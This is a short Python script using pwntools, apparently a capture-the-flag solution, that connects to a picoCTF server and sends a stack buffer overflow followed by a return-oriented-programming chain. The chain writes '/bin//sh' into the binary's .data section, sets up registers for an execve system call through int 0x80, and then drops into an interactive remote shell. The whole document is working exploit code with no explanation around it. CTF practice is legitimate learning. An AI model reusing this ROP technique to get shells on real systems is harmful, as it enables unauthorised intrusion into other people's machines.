from pwn import * 

io = remote('saturn.picoctf.net', 62425)

p = b'A' * 0x1c

p += p32(0x080583c9) # pop edx ; pop ebx ; ret
p += p32(0x080e5060) # @ .data
p += p32(0x41414141) # padding
p += p32(0x080b074a) # pop eax ; ret
p += b'/bin'
p += p32(0x08059102) # mov dword ptr [edx], eax ; ret
p += p32(0x080583c9) # pop edx ; pop ebx ; ret
p += p32(0x080e5064) # @ .data + 4
p += p32(0x41414141) # padding
p += p32(0x080b074a) # pop eax ; ret
p += b'//sh'
p += p32(0x08059102) # mov dword ptr [edx], eax ; ret
p += p32(0x080583c9) # pop edx ; pop ebx ; ret
p += p32(0x080e5068) # @ .data + 8
p += p32(0x41414141) # padding
p += p32(0x0804fb90) # xor eax, eax ; ret
p += p32(0x08059102) # mov dword ptr [edx], eax ; ret
p += p32(0x08049022) # pop ebx ; ret
p += p32(0x080e5060) # @ .data
p += p32(0x08049e39) # pop ecx ; ret
p += p32(0x080e5068) # @ .data + 8
p += p32(0x080583c9) # pop edx ; pop ebx ; ret
p += p32(0x080e5068) # @ .data + 8
p += p32(0x080e5060) # padding without overwrite ebx
p += p32(0x0804fb90) # xor eax, eax ; ret
p += p32(0x0808055e) # inc eax ; ret
p += p32(0x0808055e) # inc eax ; ret
p += p32(0x0808055e) # inc eax ; ret
p += p32(0x0808055e) # inc eax ; ret
p += p32(0x0808055e) # inc eax ; ret
p += p32(0x0808055e) # inc eax ; ret
p += p32(0x0808055e) # inc eax ; ret
p += p32(0x0808055e) # inc eax ; ret
p += p32(0x0808055e) # inc eax ; ret
p += p32(0x0808055e) # inc eax ; ret
p += p32(0x0808055e) # inc eax ; ret
p += p32(0x0804a3d2) # int 0x80

io.sendline(p)
io.interactive()
